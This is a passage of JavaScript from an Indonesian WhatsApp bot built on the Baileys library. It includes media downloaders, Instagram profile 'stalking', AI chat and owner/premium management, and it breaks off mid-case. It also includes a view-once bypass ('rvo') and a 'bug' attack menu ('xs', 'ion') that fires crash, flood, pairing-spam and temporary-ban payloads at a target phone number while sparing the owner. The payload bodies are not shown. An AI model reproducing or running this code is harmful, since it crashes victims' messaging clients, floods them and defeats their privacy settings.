					if (!json.status) return zreply('Gagal Mengambil Data, Coba Lagi.');

					let images = json.result.images; // Mengambil list gambar dari hasil
					let title = json.result.title || "TikTok Slide"; // Judul Slide
					let slide = json.result.totalSlide || "Total Slide"; // Judul Slide

					const createImage = async (url) => {
						const {
							imageMessage
						} = await generateWAMessageContent({
							image: {
								url
							}
						}, {
							upload: VxoZap.waUploadToServer
						});
						return imageMessage;
					};

					const cards = await Promise.all(images.map(async (url, index) => ({
						header: proto.Message.InteractiveMessage.Header.fromObject({
							title: `${gris}IMAGE ${index + 1}${gris}`,
							hasMediaAttachment: true,
							imageMessage: await createImage(url)
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
							buttons: [] // Tidak ada tombol
						})
					})));

					const msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadata: {},
									deviceListMetadataVersion: 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.fromObject({
									body: proto.Message.InteractiveMessage.Body.fromObject({
										text: `> ${gris}[TIKTOK FOTO SLIDE]${gris}\n\n${hiasan}Total Foto : ${slide}\n${hiasan}${title}`
									}),
									carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
										cards
									})
								})
							}
						}
					}, {});

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await VxoZap.sendButtons(m.chat, {
						"body": `\`\`「 ${gris}[ T I K T O K ]${gris} 」\`\`\n\n  *›  UNDUH AUDIO*\n${hiasan}*Author* : ${packname}`,
						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
						"buttons": [{
							"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
							"id": `ttmp3 ${q}`
						}]
					}, {
						quoted: Zets
					})
				} catch (err) {
					zreply('Terjadi kesalahan, coba lagi nanti.');
					console.error(err);
				}
			}
			break
			case 'mediafire': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Example :* \n\n*Tiktokdl Link Url*`)
				if (!text.includes('mediafire.com')) return zreply('Url Tidak Mengandung Result Dari Mediafire!')
				zreply(mess.wait)
				let api = await fetch(`https://api.betabotz.eu.org/api/download/mediafire?url=${text}&apikey=GetsuZo`)
				let betaku = await api.json();

				const {
					url,
					url2,
					filename,
					filetype,
					ext,
					upload_date,
					filesizeH,
					filesize
				} = betaku.result

				VxoZap.sendMessage(m.chat, {
					document: {
						url: url
					},
					caption: `${gris}[M E D I A  F I R E]${gris}\n\n${hiasan}*NAMA : ${filename}*\n${hiasan}*FILETYPE : ${ext}*\n${hiasan}*DATE : ${upload_date}*\n${hiasan}*SIZE : ${filesizeH}*\n\n~©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉~`,
					fileName: filename,
					mimetype: ext
				}, {
					quoted: Zets
				})
			}
			break
			//=================================================//

			// STALKING \\
			//=================================================//
			case "stalkig": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				zreply(mess.wait)
				await VxoZap.sendMessage(m.chat, {
					react: {
						text: "⚡",
						key: m.key
					}
				});
				try {
					let query = m.text.slice(8).trim();
					if (query === "") {
						zreply("*Example :* \n\n*Stalkig Username IG*");
					} else {
						let {
							data
						} = await axios.get(`https://api.betabotz.eu.org/api/stalk/ig?username=${encodeURIComponent(query)}&apikey=GetsuZo`);

						if (data.status === true && data.result) {
							let profileInfo = `${gris}[ I N S T A G R A M ]${gris}\n\n*Username : ${data.result.username}*\n*Full Name : ${data.result.fullName}*\n*Bio : ${data.result.bio}*\n*Followers : ${data.result.followers}*\n*Following : ${data.result.following}*\n*Posts : ${data.result.postsCount}*`;
							await VxoZap.sendMessage(m.chat, {
								image: {
									url: data.result.photoUrl
								},
								caption: profileInfo
							}, {
								quoted: Zets
							});
						} else {
							zreply("Terjadi Kesalahan Dalam Pengambilan Data.");
						}
					}
				} catch (error) {
					zreply("Terjadi Kesalahan Dalam Koneksi Atau Pengambilan Data.");
				}
			}
			break
			//=================================================//

			// OPEN AI \\
			//=================================================//
			case "ai": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				await VxoZap.sendMessage(m.chat, {
					react: {
						text: "⚡",
						key: m.key
					}
				});
				try {
					let q = m.text.slice(4).trim();
					if (q === "") {
						zreply("_Hello Word._");
					} else {
						let {
							data
						} = await axios.get(`https://api.betabotz.eu.org/api/search/openai-logic?text=${q}&logic=${logic}&apikey=GetsuZo`);
						if (data.status === true && data.message) {
							zreply(data.message);
						} else {
							zreply("Terjadi Kesalahan Dalam Pengambilan Data.");
						}
					}
				} catch (error) {
					zreply("Terjadi Kesalahan Dalam Koneksi Atau Pengambilan Data.");
				}
			}
			break
			case "el": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				await VxoZap.sendMessage(m.chat, {
					react: {
						text: "⚡",
						key: m.key
					}
				});
				try {
					let q = m.text.slice(4).trim();
					if (q === "") {
						zreply("_Hello Word._");
					} else {
						let {
							data
						} = await axios.get(`https://api.betabotz.eu.org/api/search/openai-chat?text=${q}&apikey=GetsuZo`);
						if (data.status === true && data.message) {
							zreply(data.message);
						} else {
							zreply("Terjadi Kesalahan Dalam Pengambilan Data.");
						}
					}
				} catch (error) {
					zreply("Terjadi Kesalahan Dalam Koneksi Atau Pengambilan Data.");
				}
			}
			break
			//=================================================//

			//VIEW ONCE\\
			case "rvo": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isQuotedViewOnce) return zreply("Reply view once")
				let type = Object.keys(m.quoted.message)[0]
				let quotedType = m.quoted.message[type]
				let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
				let buffer = Buffer.from([])
				for await (const chunk of media) {
					buffer = Buffer.concat([buffer, chunk])
				}
				if (type == "videoMessage") {
					await VxoZap.sendMessage(m.chat, {
						video: buffer,
						caption: quotedType.caption
					})
				} else if (type == "imageMessage") {
					await VxoZap.sendMessage(m.chat, {
						image: buffer,
						caption: quotedType.caption
					})
				}
			}
			break

			// Owner Fitur \\
			//=================================================//
			case "addprem": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (args.length < 2)
					return zreply(`Example :\nAddprem 62xx 30d`);
				if (m.mentionedJid.length !== 0) {
					for (let i = 0; i < m.mentionedJid.length; i++) {
						addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
					}
					zreply("Sukses Premium")
				} else {
					addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
					zreply("Sukses Via Nomer")
					await sleep(2000)
					VxoZap.sendMessage(args[0] + "@s.whatsapp.net", {
						image: {
							url: `https://telegra.ph/file/4591e4839848523095e05.jpg`
						},
						caption: `Kamu sekarang adalah Anggota Premium`
					}, {
						quoted: Zets
					})
				}
			}
			break
			//=================================================//
			case "delprem": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (args.length < 1) return zreply(`Example : \nDelprem 62xx`)
				if (m.mentionedJid.length !== 0) {
					for (let i = 0; i < m.mentionedJid.length; i++) {
						let mentionedPremiumIndex = orgkaya.findIndex(premium => premium.id === m.mentionedJid[i]);
						if (mentionedPremiumIndex !== -1) {
							orgkaya.splice(mentionedPremiumIndex, 1);
						}
					}
					fs.writeFileSync("./database/premium.json", JSON.stringify(orgkaya));
					zreply("Sukses Delete");
				} else {
					let targetNumber = args[0] + "@s.whatsapp.net"
					let targetPremiumIndex = orgkaya.findIndex(premium => premium.id === targetNumber)
					if (targetPremiumIndex !== -1) {
						orgkaya.splice(targetPremiumIndex, 1)
						fs.writeFileSync("./database/premium.json", JSON.stringify(orgkaya))
						zreply("Sukses Via Nomer")
						await sleep(2000)
						VxoZap.sendMessage(targetNumber, {
							image: {
								url: `https://telegra.ph/file/4591e4839848523095e05.jpg`
							},
							caption: ``
						}, {
							quoted: zets
						})
					} else {
						zreply("Entitas premium tidak ditemukan")
					}
				}
			}
			break
			//=================================================//
			case "addowner": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!args[0]) return zreply(`Example : \nAddowner 62xx`)
				prem1 = text.split("|")[0].replace(/[^0-9]/g, "")
				let cek1 = await VxoZap.onWhatsApp(prem1 + `@s.whatsapp.net`)
				if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
				kontributor.push(prem1)
				fs.writeFileSync("./database/owner.json", JSON.stringify(kontributor))
				zreply(`𝐍𝐞𝐰 𝐎𝐰𝐧𝐞𝐫 ${prem1}`)
				VxoZap.sendMessage(prem1 + "@s.whatsapp.net", {
					image: {
						url: `https://telegra.ph/file/5d7e84ab8efd2dbbbf31b.jpg`
					},
					caption: `𝐒𝐞𝐤𝐚𝐫𝐚𝐧𝐠 𝐊𝐚𝐦𝐮 𝐀𝐝𝐚𝐥𝐚𝐡 𝐎𝐰𝐧𝐞𝐫🎭`
				}, {
					quoted: zets
				})
			}
			break
			//=================================================//
			case "delowner": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!args[0]) return zreply(`Example : \nDelowner 62xx`)
				prem2 = text.split("|")[0].replace(/[^0-9]/g, "")
				unp = kontributor.indexOf(prem2)
				kontributor.splice(unp, 1)
				fs.writeFileSync("./database/owner.json", JSON.stringify(kontributor))
				zreply(`𝐃𝐞𝐥𝐞𝐭𝐞 𝐎𝐰𝐧𝐞𝐫 ${prem2}`)
			}
			break
			// END CASE MENU \\
			//=================================================//

			//ACCES BUG XVIP\\
			case "travazap": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				let X1 = [TheZhiro, nulll, nulll2]
				let randomIndex = Math.floor(Math.random() * X1.length)
				let V1 = X1[randomIndex]
				let itsmenu = `
╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
║
│ </> 𝙎𝙪𝙘𝙘𝙚𝙨 𝘼𝙘𝙘𝙚𝙨〽️
║ 
│›› *𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝐗𝐛𝐮𝐠 𝟔𝟐𝐱𝐱*
║›› \`𝐗𝐗𝐕𝐈𝐏\`
│
║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣
`
				const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
					"viewOnceMessage": {
						"message": {
							"interactiveMessage": {
								"contextInfo": {
									"mentionedJid": [m.sender],
									"isForwarded": true,
									"forwardingScore": 999,
									"forwardedNewsletterMessageInfo": {
										"newsletterJid": "120363298524333143@newsletter",
										"newsletterName": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
										"serverMessageId": 1
									}
								},
								"header": {
									"title": itsmenu,
									...(await prepareWAMessageMedia({
										image: TheZhiro
									}, {
										upload: VxoZap.waUploadToServer
									})),
									"hasMediaAttachment": true
								},
								"body": {
									"text": ""
								},
								"footer": {
									"text": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻"
								},
								"nativeFlowMessage": {
									"buttons": [{
										"name": "quick_reply",
										"buttonParamsJson": "{\"display_text\":\"𝐁𝐔𝐆 ☇ 𝐆𝐑𝚯𝐔𝐏️\",\"id\":\".notf\"}"
									}]
								}
							}
						}
					}
				}), {
					"userJid": m.chat,
					quoted: Zets
				})
				let XV = {
					image: TheZhiro,
					caption: itsmenu,
					contextInfo: {
						"mentionedJid": [m.sender],
						externalAdReply: {
							showAdAttribution: true,
							renderLargerThumbnail: false,
							title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
							body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
							previewType: "VIDEO",
							thumbnail: TheZhiro,
							sourceUrl: ``,
							mediaUrl: ``
						}
					}
				};
				if (db.data.settings[botNumber].menuType === "externalImage") {
					VxoZap.sendMessage(m.chat, XV, {
						quoted: Zets
					})
				} else if (db.data.settings[botNumber].menuType === "buttonImage") {
					VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					})
				}
			}
			break
			case "notf": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				let X1 = [TheZhiro, nulll, nulll2]
				let randomIndex = Math.floor(Math.random() * X1.length)
				let V1 = X1[randomIndex]
				let itsmenu = `
╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
║
│ </> 𝙎𝙪𝙘𝙘𝙚𝙨 𝘼𝙘𝙘𝙚𝙨〽️
║
│›› Bugcflow
║›› Bugoflow
│›› Bugzap
║›› Bugzet
│›› Buggc
║›› Gcui
│
║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣
`
				const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
					"viewOnceMessage": {
						"message": {
							"interactiveMessage": {
								"contextInfo": {
									"mentionedJid": [m.sender],
									"isForwarded": true,
									"forwardingScore": 999,
									"forwardedNewsletterMessageInfo": {
										"newsletterJid": "120363298524333143@newsletter",
										"newsletterName": "𝐓𝐡𝐞 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 𝐙𝐡𝐢𝐫𝐨🐉",
										"serverMessageId": 1
									}
								},
								"header": {
									"title": itsmenu,
									...(await prepareWAMessageMedia({
										image: TheZhiro
									}, {
										upload: VxoZap.waUploadToServer
									})),
									"hasMediaAttachment": true
								},
								"body": {
									"text": ""
								},
								"footer": {
									"text": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻"
								},
								"nativeFlowMessage": {
									"buttons": [{
										"name": "quick_reply",
										"buttonParamsJson": "{\"display_text\":\"𝐁𝐔𝐆 ☇ 𝐆𝐑𝚯𝐔𝐏️\",\"id\":\"\"}"
									}]
								}
							}
						}
					}
				}), {
					"userJid": m.chat,
					quoted: Zets
				})
				let XV = {
					image: TheZhiro,
					caption: itsmenu,
					contextInfo: {
						"mentionedJid": [m.sender],
						externalAdReply: {
							showAdAttribution: true,
							renderLargerThumbnail: false,
							title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
							body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
							previewType: "VIDEO",
							thumbnail: TheZhiro,
							sourceUrl: ``,
							mediaUrl: ``
						}
					}
				};
				if (db.data.settings[botNumber].menuType === "externalImage") {
					VxoZap.sendMessage(m.chat, XV, {
						quoted: Zets
					})
				} else if (db.data.settings[botNumber].menuType === "buttonImage") {
					VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					})
				}
			}
			break
			case 'xs': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let target = incTarget + '@s.whatsapp.net'
				global.jumlah = text.split("|")[1]

				let sections = [{
						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐙͢𝐧ͯ𝐱𝐈͢𝐯ͮ𝐬 𝐗͢𝟏༑',
							id: `Znxivs ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐗𝐳͢𝐞ͯ𝐭𝐬 𝐗͢𝟐༑',
							id: `Vzets ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐓𝐫͢𝐚𝐬ͮ𝐡 𝐗͢𝟑༑',
							id: `Suxo ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐕𝐢͢𝐬ͯ𝐢𝐋͢𝐨ͮ𝐜 𝐗͢𝟒༑',
							id: `Trashloc ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐙𝐞͢𝐭𝐬ͦ𝐮 𝐗͢𝟓༑',
							id: `Zetsu ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐓𝐞͢𝐝𝐞ͯ𝐱 𝐗͢𝟔༑',
							id: `Tedex ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐈𝐧ͮ͢𝐕𝐢𝐬ͯ͢𝐢𝐗 𝐗͢𝟕༑',
							id: `Invisix ${incTarget}`
						}]
					},
					{
						title: '⌜ 𝐈𝚯𝐒 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐕͢𝒐𝒊ͯ͢𝒅𝐅͢𝒍𝒖ͯ͢𝒙 𝐈𝐨ͮ͢𝐒༑',
							description: `☇`,
							id: `Void ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
							description: `☇`,
							id: `Crashios ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
							description: `☇`,
							id: `Trashios ${incTarget}`
						}]
					},
					{
						title: '⌜ 𝐀𝐍𝐃𝐑𝚯 𝐗 𝐈𝚯𝐒 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐆𝐞𝐭𝐬͢𝐮𝐳𝐨𝐙͢𝐡𝐢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐄𝐱ͮ͢𝐓𝐞𝐧ͯ͢𝐝𝐗༑',
							description: `ϟ`,
							id: `Extend ${incTarget}`
						}]
					},
					{
						title: '⌜ 𝐗 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐆𝐞𝐭𝐬͢𝐮𝐳𝐨𝐙͢𝐡𝐢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐙𝐞͢𝐫𝐨༑',
							description: `ϟ`,
							id: `Zero ${incTarget}`
						}]
					},
					{
						title: '⌜ 𝐙𝐍𝐗 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡𝐅𝐥͢𝐨ͮ𝐰༑',
							id: `Crashflow ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧༑',
							id: `Vasion ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐓𝐫ͯ͢𝐚𝐬ͮ𝐡𝐅𝐥͢𝐨ͯ𝐰༑',
							id: `Trashflow ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐙͢𝐧ͯ𝐱͢𝐕𝐬ͦ༑',
							id: `Znxvs ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝚯𝐯ͯ͢𝐞𝐫ͮ𝐅𝐥͢𝐨ͯ𝐰༑',
							id: `Overflow ${incTarget}`
						}]
					},
					{
						title: '⌜ 𝐗𝚯 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐆͢𝐋𝐗͢𝐂𝐋༑',
							id: `Glxcl ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐕𝐃͢𝚵𝐗༑',
							id: `Vdex ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐈𝐎͢𝐍ͯ𝐒͢𝐐𝐋༑',
							id: `Ion ${incTarget}`
						}]
					},
					{
						title: '⌜ 𝚯𝐕𝐃 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐅𝐥͢𝐨ͮ𝐰༑',
							id: `Flowinfinite ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐈𝐯ͯ͢𝐒༑',
							id: `Invisixflods ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐔ͯ͢𝐈༑',
							id: `Infiniteui ${incTarget}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐓͢𝐫𝐚ͯ͢𝐬𝐡 𝐔ͯ͢𝐈༑',
							id: `Trashui ${incTarget}`
						}]
					},
					{
						title: '⌜ 𝐋𝚯𝚯𝐏 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐅𝐥͢𝐨ͯ𝐨ͦ͢𝐝𝐬ͮཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐒͢𝐩𝐚ͯ͢𝐦 𝐏𝐚ͮ͢𝐢𝐫༑',
							id: `Spampair ${incTarget}|150`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐅𝐥͢𝐨ͯ𝐨ͦ͢𝐝𝐬ͮཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐒͢𝐩𝐚ͯ͢𝐦 𝐎͢𝐭ͯ𝐩༑',
							id: `Tempban ${q}`
						}]
					}
				]

				let listMessage = {
					title: `𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸`,
					sections
				};

				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardingScore: 999,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉️',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: ''
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: `⿻  ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟  ⿻`
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`,
									subtitle: `️`,
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: thumbSky
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "single_select",
										"buttonParamsJson": JSON.stringify(listMessage)
									}, ]
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				})
			}
			break
			// CASE BUG \\
			//=================================================//
			case 'ion': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ION Number_\n_Example : ION 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ION Number_\n_Example : ION 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await StuckSql(X, GetsuZo, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
